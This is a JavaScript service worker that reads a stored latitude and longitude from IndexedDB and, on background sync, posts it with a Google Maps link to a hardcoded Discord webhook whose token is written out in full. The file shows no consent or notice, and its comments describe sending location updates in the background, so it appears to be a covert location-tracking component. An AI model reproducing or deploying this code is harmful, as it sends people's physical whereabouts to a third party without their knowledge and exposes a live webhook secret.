// ✅ Install & Activate Service Worker
self.addEventListener("install", function (event) {
    self.skipWaiting();
});

self.addEventListener("activate", function (event) {
    event.waitUntil(self.clients.claim());
});

// ✅ Background Sync Event Listener (Keeps Sending Location Updates in Background)
self.addEventListener("sync", function (event) {
    if (event.tag === "syncLocation") {
        event.waitUntil(fetchLocationAndSend());
    }
});
self.addEventListener("fetch", (event) => {
    event.respondWith(fetch(event.request));
});

// ✅ Fetch Last Location from IndexedDB & Send it to Discord
async function fetchLocationAndSend() {
    return new Promise((resolve, reject) => {
        openDatabase().then(db => {
            getLocationFromDB(db).then(async (locationData) => {
                if (!locationData) {
                    console.warn("⚠️ No location data available for background update.");
                    return resolve();
                }

                const { latitude, longitude } = locationData;
                const payload = {
                    content: `📍 **Background Location Update:**\n🌍 **Latitude:** ${latitude}\n🗺️ **Longitude:** ${longitude}\n🔗 [Google Maps](https://www.google.com/maps/place/${latitude},${longitude})`
                };

                try {
                    const response = await fetch("https://discord.com/api/webhooks/1337946103924133898/eudcofLWR_ryLQivFc1hgFf2v01Fy9RSIQJxd5G1Qo5VGeyWOtVKR5E-t-mr-XddLL1X", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(payload),
                    });

                    if (!response.ok) throw new Error(`🚨 Webhook failed: ${response.status} ${response.statusText}`);
                    console.log("✅ Background location sent successfully!");
                } catch (error) {
                    console.error("🚨 Error sending background location:", error);
                }

                resolve();
            }).catch(reject);
        }).catch(reject);
    });
}

// ✅ Open IndexedDB for Storing & Retrieving Last Known Location
function openDatabase() {
    return new Promise((resolve, reject) => {
        const request = indexedDB.open("LocationDB", 2);

        request.onupgradeneeded = function (event) {
            const db = event.target.result;
            if (!db.objectStoreNames.contains("locations")) {
                db.createObjectStore("locations", { keyPath: "id" });
            }
        };

        request.onsuccess = function () {
            resolve(request.result);
        };

        request.onerror = function () {
            reject("❌ Error opening IndexedDB");
        };
    });
}

// ✅ Get Last Stored Location from IndexedDB
function getLocationFromDB(db) {
    return new Promise((resolve, reject) => {
        const transaction = db.transaction("locations", "readonly");
        const store = transaction.objectStore("locations");
        const getRequest = store.get("latest");

        getRequest.onsuccess = function () {
            resolve(getRequest.result);
        };
        getRequest.onerror = function () {
            reject("❌ Error retrieving location from IndexedDB");
        };
    });
}

// ✅ Respond to Fetch Requests (Offline Mode Support)
self.addEventListener("fetch", function (event) {
    event.respondWith(fetch(event.request).catch(() => new Response("Offline")));
});
